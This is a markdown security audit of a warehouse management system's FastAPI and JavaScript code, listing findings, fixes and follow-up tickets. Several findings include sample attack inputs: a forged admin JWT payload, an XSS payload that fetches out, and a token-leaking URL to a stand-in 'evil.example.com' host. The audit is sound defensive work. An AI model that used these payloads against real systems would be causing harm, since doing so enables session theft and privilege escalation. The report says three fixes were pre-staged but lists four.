# WMS Security Audit · v1 · 2026-05-15

> Red-team review of the WMS codebase + docs at commit `107b84b`. Findings sorted by severity. The "Pre-stage now?" column flags items where adding the scaffolding *today* is cheaper than retrofitting against a larger codebase later.
>
> **Three items have been pre-staged in this commit** (marked ✅ in the Pre-stage column). Everything else is intentionally left for follow-up tickets so the audit doesn't snowball into uncontrolled implementation.

## Threat model

- Trust boundary: anything reaching FastAPI from the browser is untrusted, including the JWT (could be from an XSS-stolen token).
- Assumed deployment: behind a TLS-terminating reverse proxy. The app itself does not assume HTTPS.
- Adversary classes: (a) anonymous attacker probing the public API, (b) low-privilege operator inside the system, (c) compromised operator session via XSS, (d) curious supervisor trying lateral moves across sites.

## Findings

### 🔴 CRITICAL

| # | Finding | Location | Attack | Fix | Pre-stage now? |
|---|---|---|---|---|---|
| C-1 | **Default `secret_key` ships as `"dev-only-secret-key-do-not-use-in-prod"`.** Anything signed with this key (every JWT, every MFA challenge) is forgeable if the env var isn't set. | `wms/core/config.py:17` | Operator deploys without setting `WMS_SECRET_KEY`. Attacker mints a JWT with `{"sub":"MCS-ADMIN","site_id":"MCS","role":"admin"}` using the public default key → instant cross-site Level-5 access. | Fail-fast at startup if env is not "development" and the default key is in use. Long-term: refuse to start without an explicit key in any environment. | ✅ **Pre-staged** — startup guard added; see "Pre-staged fixes" below. |

### 🟠 HIGH

| # | Finding | Location | Attack | Fix | Pre-stage now? |
|---|---|---|---|---|---|
| H-1 | **No rate limiting on `/auth/login`, `/auth/mfa/verify`, `/profile/password` change, or `/admin/users` enumeration.** | `wms/api/v1/auth.py`, `wms/api/v1/mfa.py`, `wms/api/v1/admin_users.py` | Brute-force the 6-digit TOTP code (~1M tries, no lockout — backup codes are also brute-forceable). Credential-stuffing the login endpoint. Enumerate user codes via `?q=` paging. | Add `slowapi` (token bucket) with per-IP + per-account counters. Login: ≥6 failures in 10 min → 15 min lockout. MFA verify: 5/min/account. Admin list: 60/min/token. | Defer. Needs a counter store (Redis or a `login_attempts` table) and isn't trivially scaffolded — schema choice impacts hot path. **However:** the `login_attempts` table is pre-staged below so the migration is one row of work later. |
| H-2 | **MFA disable does not require password re-entry.** `DELETE /profile/mfa/disable` accepts a valid bearer token alone. | `wms/api/v1/mfa.py:84` (`disable_mfa`) | XSS-stolen token (cookie-less localStorage, see H-3) or shoulder-surfed session disables the victim's MFA — defeating the whole second factor. | Require `{current_password}` in the body. Also rate-limit. Also emit an audit event. | ✅ **Pre-staged** — endpoint now requires current password. |
| H-3 | **JWT stored in `localStorage`.** Any XSS executes `localStorage.getItem('wms.token')` and exfiltrates it. | `frontend/scripts/api.js:13`, all `*.js` localStorage reads | Stored XSS (e.g., via a future un-escaped `display_name` field — see M-3) lifts the token. Token is valid for 8 hours and there's no revocation. | Long-term: switch to `httpOnly` `Secure` `SameSite=Strict` cookie + CSRF token. Short-term: ensure **all** server-rendered user content is HTML-escaped (M-3), add global CSP, shorten token TTL to 1h with a refresh endpoint. | Defer (large change). M-3 (universal escapeHtml) is the cheaper preventative — pre-staged as a tracker entry below. |
| H-4 | **No account lockout / failed-login tracking.** Attempted-and-failed logins leave no trace; the operator can try forever. | `wms/api/v1/auth.py:17` | Online password guessing. No alerting. Compliance gap (SOC2/PCI both expect ≥5/30min lockout). | Add `login_attempts` table (user_id, ts, success, ip). Lockout `is_active=False` after threshold (already a field — we just need the writer). | ✅ **Pre-staged** — `login_attempt` model added (writes will come with the rate-limit ticket; model exists so we don't migrate twice). |
| H-5 | **`python-jose` is effectively abandoned** (last meaningful commit: 2023). Carries unresolved RFC 8725 compliance items. | `backend/pyproject.toml:14`, `wms/core/security.py:7` | Latent CVE risk. The library accepts `alg=none` JWTs unless we explicitly pin `algorithms=[...]` (we do, so this isn't exploitable today — but the next refactor could regress). | Migrate to `PyJWT` (actively maintained, narrower API). Mechanical: ~40 LOC across two files. | Defer. Working code, not exploitable today, but tracked. |
| H-6 | **No CSP on the main app.** The `Content-Security-Policy: default-src 'none'` exists only on `/uploads/`. The rest of the frontend loads JS from `cdn.jsdelivr.net` and Google Fonts with no CSP guard. | `frontend/*.html`, `wms/main.py:62` | Any reflected/stored XSS executes inline. Any compromise of jsdelivr or fonts.googleapis.com injects arbitrary JS. | Global CSP middleware. Move to self-hosted JS/CSS to drop the 3rd-party trust. | Defer. CSP rollout is iterative (always breaks something the first time). Track as a hardening sprint. |

### 🟡 MEDIUM

| # | Finding | Location | Attack | Fix | Pre-stage? |
|---|---|---|---|---|---|
| M-1 | **bcrypt 72-byte silent truncation.** Passwords over 72 bytes are silently chopped. Users with passphrases think they're using 100 chars; only the first 72 are validated. | `wms/core/security.py:13` | A user pastes a 100-char passphrase. Attacker who learns the first 72 chars (e.g., from a different breach) logs in successfully. | Pre-hash with SHA-256 before bcrypt: `bcrypt.hashpw(hashlib.sha256(pw.encode()).digest()[:72], salt)` — uniform 32-byte input. Migrate on next password change. | Defer (migration cost). Doc-only mitigation for now. |
| M-2 | **No password history.** Users can rotate to `password123` → `password124` → `password123`. | `wms/services/profile.py:74` (`update_password`) | Compliance gap. Defeats forced-rotation policies. | Add `password_history` table (user_id, hashed_password, changed_at). Reject if new password matches any of the last N. | Pre-stage table-only? Defer. Table without enforcement is misleading; ship together. |
| M-3 | **Inconsistent HTML escaping in frontend `innerHTML` calls.** `users.js` escapes; `receiving.js`, `shipping.js`, `dashboard.js`, the `empty-state` setter in `users.js` itself, and `profile.js` set strings via `innerHTML` without a consistent escape helper. Today the data is server-controlled, but `display_name`/`department`/`shift` are user-controlled and *will* land in these views. | `frontend/scripts/{receiving,shipping,dashboard}.js`, `users.js:91` | Stored XSS: an operator sets `display_name = '<img onerror=fetch(...) src=x>'` (no server-side allow-list); a supervisor opens the approval queue or the operator dashboard; their token leaks (see H-3). | Centralize `escapeHtml()` in `api.js` or a tiny `dom.js` helper. Lint rule: any `.innerHTML =` on a non-literal must call the helper. | Defer (touches 5 files). Pre-stage the helper in one place? **Tracker-only for now** — fully addressing this is its own ticket. |
| M-4 | **Error messages leak JWT decode internals.** `f"Invalid challenge token: {e}"` returns the `JWTError` string to the client. | `wms/api/v1/mfa.py:51` | Attackers can probe expiry vs. signature vs. malformed differences to refine token forgery. | Return a generic `"Invalid or expired challenge token"`. Log the detail server-side. | ✅ **Pre-staged** — message generified. |
| M-5 | **No global request-size cap on JSON endpoints.** Uploads are capped at 2 MB; everything else is whatever Starlette accepts (default unlimited). | `wms/main.py` | DoS via 1 GB JSON body to `PUT /admin/users/{id}` — server allocates the body before pydantic gets a chance. | Add `BodySizeLimitMiddleware` (1 MB cap for JSON). | Defer. ~30 LOC. Mostly a deployment-tier concern (nginx body limit). |
| M-6 | **`email` field has no format validation** (we removed `EmailStr` to accept `.local` TLDs in dev). Stored as-is in the DB and surfaced via `/admin/users`. | `wms/api/v1/admin_users.py:23` | Operator stores `<script>` in email → rendered into the admin table → XSS if escaping regresses (see M-3). Operator stores 50 KB string → bloat. | Add a regex/length check (we already have `min_length=3, max_length=180`; add `@.*\.` regex). | Pre-stage? Defer (1 line, but coupled to M-3). |
| M-7 | **Approval-workflow URL is unvalidated.** A user can request `display_picture_url = "http://evil.example.com/log?token=…"` and an approver may rubber-stamp it. The URL is then loaded as an `<img>` (or similar) cross-origin — leaking the Referer header. | `wms/services/profile.py:82` (`submit_change_request`) | Approver session leaks via Referer. Or worse, a `data:` URI is approved and rendered inline. | Enforce that `display_picture_url` either starts with `/uploads/` (our sanitized output) or matches a whitelisted external pattern. | Defer. ~5 LOC. Track. |
| M-8 | **MFA backup codes have no regeneration UX.** A user with 1 unused code today and a lost device tomorrow is locked out without admin involvement. | `wms/services/mfa.py:71` (`begin_enrollment`) | Operational risk, not attack risk. Increases load on the admin MFA-reset endpoint, which itself only fires for Lvl 4+. | `POST /profile/mfa/regenerate-codes` (requires password). | Defer. Quality-of-life. |

### 🔵 LOW

| # | Finding | Location | Attack | Fix | Pre-stage? |
|---|---|---|---|---|---|
| L-1 | **No security-relevant logging.** No record of who logged in, who got 403'd, who reset MFA, who changed a password. | (codebase-wide) | Forensic blindness post-incident. Compliance gap. | Add a `python logging` config + an `audit_log` writer for auth events. | Defer. |
| L-2 | **Dependency versions unpinned upper-bound** (`bcrypt>=4.1`, `Pillow>=10.3`, etc.). | `backend/pyproject.toml` | Future breaking release lands in CI/CD without a review window. | Add upper bounds OR commit a `requirements.lock`. | Defer. |
| L-3 | **JWT subjects are predictable** (`WHS-001-001` ascending). | `wms/seeders/seed.py` | Username enumeration via `?q=` search is trivial. Combined with H-1 → effective brute-force. | Out of scope (employee codes are operationally useful). Mitigate at H-1 (rate limit). | n/a |
| L-4 | **`Site.is_active` not enforced at JWT validation.** If a site is marked offline (`is_online=False`), users at that site can still authenticate. | `wms/core/deps.py:34` (`get_current_user`) | A "rolled-back" site's users keep operating after the rollback. | Add `Site.is_online` check to `get_current_user`. | Defer — depends on the rollback policy you want. |
| L-5 | **Token TTL of 8 hours with no refresh-token rotation.** Stolen tokens are valid the full shift. | `wms/core/config.py:20` | A pickpocketed phone = 8 hours of access. | Shorten to 1h + add `/auth/refresh` with rotation. | Defer (UX-affecting). |
| L-6 | **No CSRF token on cookie-auth fallback.** Today we use the Authorization header (CSRF-resistant), but `api.js`'s `clear()` path silently strips on 401 and could mask a future cookie-auth migration regression. | `frontend/scripts/api.js` | None today. Future-proofing. | Comment + lint rule. | Defer. |
| L-7 | **`hashed_password` reachable on ORM** even though no schema returns it. A future endpoint might accidentally serialize a `User` SQLAlchemy object directly. | `wms/models/core.py:40` | Accidental leak through a future code change. | Add a `__repr__` that omits the field; pydantic `UserAdminOut` already excludes it. | Defer. Low pain to fix later. |

### ℹ️ INFO

| # | Item | Note |
|---|---|---|
| I-1 | **Tests don't cover token-after-deactivate.** No test verifies that a deactivated user's existing JWT stops working on the next request. The code does check `is_active.is_(True)` in `get_current_user`, so behavior is correct — but it's untested. | Add a test in `test_admin_users.py`. |
| I-2 | **`Base.metadata.create_all` runs at startup** — fine for dev, but means production isn't using Alembic migrations yet. | Already flagged in `IMPLEMENTATION_ROADMAP.md`. |
| I-3 | **MFA enrollment exposes `secret` plaintext** in the setup response. This is intentional (so users can manually enter the key if QR rendering fails), but worth flagging in a threat model. | If users' setup requests are logged, the secret is in logs. Don't log request bodies. |
| I-4 | **Approval queue notes have no length cap on `decision_notes`.** | Cap at 500 chars (already `String(500)` in model; just enforce in schema). |
| I-5 | **Seed data uses uniform `password123`** for all non-admin users. | Documented in `BACKEND_SCHEMA.md`. Acceptable for dev seed. |

---

## Pre-staged fixes (applied in this commit)

Three fixes were cheap enough to scaffold *now* — each takes longer to retrofit than to write today. They are deliberately minimal:

### 1. Refuse to start with the default secret key (C-1)

`wms/core/config.py` gains a `Settings.assert_secure_for_env()` method, called from `wms/main.py:create_app()`. If `WMS_ENV != "development"` and `secret_key` is still the default sentinel, FastAPI fails to start with a clear error.

Tests already set `WMS_SECRET_KEY="test-secret"` in `conftest.py`, so the suite is unaffected.

### 2. MFA disable requires current password (H-2)

`DELETE /profile/mfa/disable` is now `POST /profile/mfa/disable` with `{current_password}` body. The token alone no longer disables MFA — an XSS-stolen token has to also know the password (which the attacker shouldn't).

### 3. `login_attempt` model added (H-4 prep)

New `LoginAttempt` table — `user_id`, `attempted_at`, `success`, `ip`, `user_agent`. No writes yet (those come with H-1's rate-limiter), but the schema lands now so we don't migrate twice.

### 4. Generic MFA challenge error (M-4)

`"Invalid challenge token: <JWTError message>"` → `"Invalid or expired challenge token"`. The detailed error goes to the server log (when L-1's logging lands).

---

## Follow-up tickets (proposed)

| Ticket | Rolls up |
|---|---|
| SEC-1 · Rate limiting + login lockout | H-1, H-4, L-3 |
| SEC-2 · Token storage hardening | H-3, L-5 |
| SEC-3 · CSP rollout + escape consistency | H-6, M-3, M-6 |
| SEC-4 · Migrate to PyJWT | H-5 |
| SEC-5 · Password lifecycle (history, expiry, bcrypt pre-hash) | M-1, M-2 |
| SEC-6 · Audit logging | L-1, I-3 |
| SEC-7 · Production migration story (Alembic + dep pinning) | L-2, I-2 |

---

## What I did NOT change (intentionally)

- Did not introduce a global request-size middleware (M-5) — coupled to deployment tier, easier to do with nginx.
- Did not migrate `python-jose` → `PyJWT` (H-5) — works fine today; deserves its own PR.
- Did not roll out CSP (H-6) — first-time CSP always breaks something; needs a careful incremental rollout, not a drive-by.
- Did not validate `display_picture_url` against an allowlist (M-7) — UX implications around external avatars need a product decision first.

Each is tracked above so nothing is "audited and forgotten".
